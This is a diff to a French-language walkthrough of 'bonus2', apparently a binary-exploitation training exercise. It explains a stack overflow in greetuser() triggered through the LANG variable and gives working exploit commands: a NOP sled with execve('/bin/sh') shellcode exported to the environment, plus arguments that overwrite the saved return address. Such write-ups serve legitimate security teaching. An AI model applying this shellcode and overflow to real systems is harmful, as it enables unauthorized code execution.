@@ -1,3 +1,4 @@
+-- bonus2 -- 
 Ici le programme possède 2 buffers de respectivement 40 et 32 bytes dans lesquels il strncpy av[1] puis av[2]
 La première copie est donc protégée. Cependant dans la fonction greetuser(), on choisit une de ces 3 strings
 en fonction de la variable d'environnement LANG:
@@ -15,4 +16,4 @@ Une fois cela fait, on peut écraser la sauvegarde d'eip de greetuser(). On va u
 exporter 200 NOPs et un shellcode dans l'env puis faire return greetuser() au milieu des NOPs.
 export LANG="fi"
 export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
-$(perl -le 'print "A"x40') $(perl -le 'print "B"x18 . "\x91\xf8\xff\xbf"')
+./bonus2 $(perl -le 'print "A"x40') $(perl -le 'print "B"x18 . "\x91\xf8\xff\xbf"')
